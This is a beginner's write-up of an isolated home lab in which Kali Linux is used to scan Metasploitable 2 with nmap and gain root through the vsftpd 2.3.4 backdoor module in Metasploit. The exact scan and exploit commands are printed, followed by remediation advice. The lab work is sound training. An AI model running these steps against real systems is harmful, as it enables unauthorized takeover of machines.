# Home Security Lab: Kali Linux vs. Metasploitable 2

This is my first hands-on cybersecurity project. I built a small, isolated
lab to practice scanning and exploiting a vulnerable machine safely.

## Setup

- **Attacker:** Kali Linux (nmap, Metasploit) — 192.168.56.101
- **Target:** Metasploitable 2 (intentionally vulnerable Linux) — 192.168.56.102
- **Host:** VirtualBox on Windows

Both machines run on a VirtualBox host-only network, so the vulnerable
target has no internet access and stays isolated from my home network.

## What I did

**1. Scanned the target** for open ports and service versions:

nmap -sV 192.168.56.102

This found 23 open ports running old, vulnerable services, including
vsftpd 2.3.4 on port 21, which has a known backdoor.

**2. Exploited the vsftpd 2.3.4 backdoor** using Metasploit:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run

The exploit worked and gave me a root shell. Running `id` returned
`uid=0(root)` — full control of the machine.

## How to fix it

- Upgrade vsftpd to a current, patched version
- Remove or patch other outdated services (Telnet, old Samba)
- Use SSH instead of unencrypted Telnet

## What I learned

How to build an isolated lab, use nmap to find outdated software, and how
one old service can lead to a full system takeover. Next I want to add a
Windows machine and a SIEM to practice detecting attacks like this.

## Tools

nmap · Metasploit · Kali Linux · VirtualBox
